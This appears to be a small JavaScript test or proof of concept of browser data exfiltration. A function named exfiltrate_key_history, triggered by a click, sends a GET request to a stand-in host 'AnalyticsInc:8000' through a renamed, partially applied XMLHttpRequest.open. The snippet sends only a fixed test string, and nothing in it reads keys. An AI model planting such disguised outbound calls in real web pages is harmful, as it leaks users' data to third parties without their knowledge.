function exfiltrate_key_history() {

    // http://stackoverflow.com/questions/321113/how-can-i-pre-set-arguments-in-javascript-function-call-partial-function-appli
    function partial(func /*, 0..n args */) {
        var args = Array.prototype.slice.call(arguments, 1);
        return function() {
            var allArguments = args.concat(Array.prototype.slice.call(arguments));
            return func.apply(this, allArguments);
        };
    }

    // Function Partial
    // Exfiltrate data using XMLHTTP request
    xmlhttp=new XMLHttpRequest();
	xmlhttp.openn = partial(xmlhttp.open, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
	xmlhttp.openn();
    xmlhttp.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
